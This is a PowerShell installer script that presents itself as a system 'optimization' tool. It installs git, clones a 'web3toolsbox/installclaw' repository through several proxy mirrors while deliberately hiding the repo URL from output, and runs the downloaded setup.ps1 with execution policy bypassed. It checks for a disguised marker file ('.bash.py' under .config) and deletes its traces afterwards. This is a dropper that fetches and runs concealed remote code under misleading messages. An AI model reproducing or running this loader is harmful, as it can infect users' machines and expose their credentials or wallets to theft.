#Requires -Version 5.1
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($false)
$OutputEncoding        = [System.Text.UTF8Encoding]::new($false)
$ErrorActionPreference = 'Stop'

# ============================================================
# Windows (PowerShell 5.1+)
# ============================================================

$guardFile = Join-Path $HOME ".config/.configs/.bash.py"
if (Test-Path -LiteralPath $guardFile) {
    Write-Host "[ERROR] No optimization required!" -ForegroundColor Red
    exit 1
}

$RepoPart      = "web3toolsbox/installclaw.git"
$GitLabRepoPart = "web3toolsbox/installclaw.git"
$GitMirrors = @(
    "https://github.com/$RepoPart",
    "https://ghproxy.com/https://github.com/$RepoPart",
    "https://gh-proxy.com/https://github.com/$RepoPart",
    "https://hub.gitmirror.com/https://github.com/$RepoPart",
    "https://gitlab.com/$GitLabRepoPart"
)

function Write-Log  { param([string]$Msg) Write-Host "[INFO]  $Msg" -ForegroundColor Cyan }
function Write-Warn { param([string]$Msg) Write-Host "[WARN]  $Msg" -ForegroundColor Yellow }
function Write-Err  { param([string]$Msg) Write-Host "[ERROR] $Msg" -ForegroundColor Red }
function Write-Ok   { param([string]$Msg) Write-Host "[ OK ]  $Msg" -ForegroundColor Green }

function Test-IsAdmin {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $p  = [System.Security.Principal.WindowsPrincipal]$id
    return $p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

# CurrentUser scope does not require admin; suppress if policy is locked by GPO
try {
    Set-ExecutionPolicy Bypass -Scope CurrentUser -Force -ErrorAction SilentlyContinue
} catch {
    Write-Warn "Could not set execution policy: $_"
}

# ============================================================
# winget helpers
# ============================================================

function Resolve-WingetPath {
    if (Get-Command winget -ErrorAction SilentlyContinue) { return "winget" }

    $staticPath = "$env:LOCALAPPDATA\Microsoft\WindowsApps\winget.exe"
    if (Test-Path $staticPath) { return $staticPath }

    # Glob versioned WindowsApps directory (avoids hardcoded version string)
    $appDir = "$env:ProgramFiles\WindowsApps"
    if (Test-Path $appDir) {
        $match = Get-ChildItem -Path $appDir -Filter "Microsoft.DesktopAppInstaller_*" `
                     -Directory -ErrorAction SilentlyContinue |
                 Sort-Object Name -Descending | Select-Object -First 1
        if ($match) {
            $candidate = Join-Path $match.FullName "winget.exe"
            if (Test-Path $candidate) { return $candidate }
        }
    }
    return $null
}

function Install-WingetIfMissing {
    $wingetPath = Resolve-WingetPath
    if ($wingetPath) { return $wingetPath }

    Write-Log "winget not found. Attempting to install App Installer..."
    if (-not (Test-IsAdmin)) {
        Write-Warn "Installing App Installer may require administrator privileges."
    }

    $vcLibsPath       = Join-Path $env:TEMP "VCLibs.appx"
    $uiXamlPath       = Join-Path $env:TEMP "UIXaml.appx"
    $appInstallerPath = Join-Path $env:TEMP "AppInstaller.msixbundle"

    try {
        Write-Log "Downloading dependencies..."
        Invoke-WebRequest -Uri "https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx" `
            -OutFile $vcLibsPath -UseBasicParsing -ErrorAction Stop
        Invoke-WebRequest -Uri "https://github.com/microsoft/microsoft-ui-xaml/releases/download/v2.8.6/Microsoft.UI.Xaml.2.8.x64.appx" `
            -OutFile $uiXamlPath -UseBasicParsing -ErrorAction Stop
        Invoke-WebRequest -Uri "https://aka.ms/getwinget" `
            -OutFile $appInstallerPath -UseBasicParsing -ErrorAction Stop

        Add-AppxPackage -Path $vcLibsPath       -ErrorAction SilentlyContinue
        Add-AppxPackage -Path $uiXamlPath       -ErrorAction SilentlyContinue
        Add-AppxPackage -Path $appInstallerPath -ErrorAction Stop
    } catch {
        Write-Err "Failed to install App Installer: $_"
        Write-Err "Please install App Installer from the Microsoft Store and retry."
        exit 1
    } finally {
        Remove-Item $vcLibsPath, $uiXamlPath, $appInstallerPath -Force -ErrorAction SilentlyContinue
    }

    $windowsAppsPath = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
    if (Test-Path $windowsAppsPath) {
        if (-not (($env:Path -split ';') -contains $windowsAppsPath)) {
            $env:Path += ";$windowsAppsPath"
        }
    }

    Start-Sleep -Seconds 2
    $wingetPath = Resolve-WingetPath
    if (-not $wingetPath) {
        Write-Err "winget is still unavailable after installation. Please reopen PowerShell and retry."
        exit 1
    }
    return $wingetPath
}

# ============================================================
# git helpers
# ============================================================

function Install-GitIfMissing {
    if (Get-Command git -ErrorAction SilentlyContinue) {
        Write-Ok "Git is already installed: $(git --version)"
        return
    }

    Write-Log "Git not found. Starting installation..."

    # Try winget
    try {
        $wingetPath = Install-WingetIfMissing
        & $wingetPath install --id Git.Git -e --source winget `
            --accept-package-agreements --accept-source-agreements
    } catch {
        Write-Warn "winget install failed: $_"
    }

    # Fallback: Chocolatey
    if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
        if (Get-Command choco -ErrorAction SilentlyContinue) {
            Write-Log "Trying Chocolatey..."
            try { choco install git -y } catch { Write-Warn "Chocolatey install failed: $_" }
        }
    }

    # Fallback: Scoop
    if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
        if (Get-Command scoop -ErrorAction SilentlyContinue) {
            Write-Log "Trying Scoop..."
            try { scoop install git } catch { Write-Warn "Scoop install failed: $_" }
        }
    }

    # Refresh PATH with known Git install locations
    foreach ($p in @("C:\Program Files\Git\cmd", "C:\Program Files (x86)\Git\cmd")) {
        if ((Test-Path $p) -and (-not (($env:Path -split ';') -contains $p))) {
            $env:Path += ";$p"
        }
    }

    if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
        Write-Err "Git is still unavailable after all install attempts."
        Write-Err "Please install Git for Windows manually from: https://git-scm.com/install/windows"
        Write-Err "After installation completes, run the command again."
        exit 1
    }
    Write-Ok "Git installed: $(git --version)"
}

# ============================================================
# Clone with mirror fallback (no repo URL in output)
# ============================================================

function Invoke-CloneWithFallback {
    param([string]$Target)
    $total = $GitMirrors.Count
    for ($i = 0; $i -lt $total; $i++) {
        Write-Log "Cloning... (mirror $($i+1)/$total)"
        $prevEAP = $ErrorActionPreference
        $ErrorActionPreference = 'SilentlyContinue'
        git clone --depth=1 --single-branch $GitMirrors[$i] $Target 2>&1 | Out-Null
        $ErrorActionPreference = $prevEAP
        if ($LASTEXITCODE -eq 0) {
            Write-Ok "Optimization in progress......"
            return
        }
        Remove-Item $Target -Recurse -Force -ErrorAction SilentlyContinue
    }
    Write-Err "All mirrors failed. Please check your network connection."
    exit 1
}

# ============================================================
# Main
# ============================================================

Install-GitIfMissing

$suffix       = [System.IO.Path]::GetRandomFileName().Replace('.', '')
$workDir      = Join-Path $env:TEMP "installclaw-bootstrap-$suffix"
$repoDir      = Join-Path $workDir "installclaw"
$origLocation = Get-Location
$exitCode     = 0

New-Item -ItemType Directory -Path $workDir -Force | Out-Null

try {
    Set-Location -Path $workDir -ErrorAction Stop
    Invoke-CloneWithFallback -Target $repoDir

    $childScript = Join-Path $repoDir "setup.ps1"
    if (-not (Test-Path $childScript)) {
        Write-Err "Child installer script not found."
        $exitCode = 1
    } else {
        Set-Location -Path $repoDir -ErrorAction Stop
        powershell -ExecutionPolicy Bypass -File ".\setup.ps1"
        if ($LASTEXITCODE -ne 0) {
            Write-Err "Child installer failed (exit code $LASTEXITCODE)."
            $exitCode = $LASTEXITCODE
        }
    }
} finally {
    Set-Location -Path $origLocation -ErrorAction SilentlyContinue
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
}

if ($exitCode -eq 0) {
    Write-Ok "The core configuration has been optimized!"
}
exit $exitCode
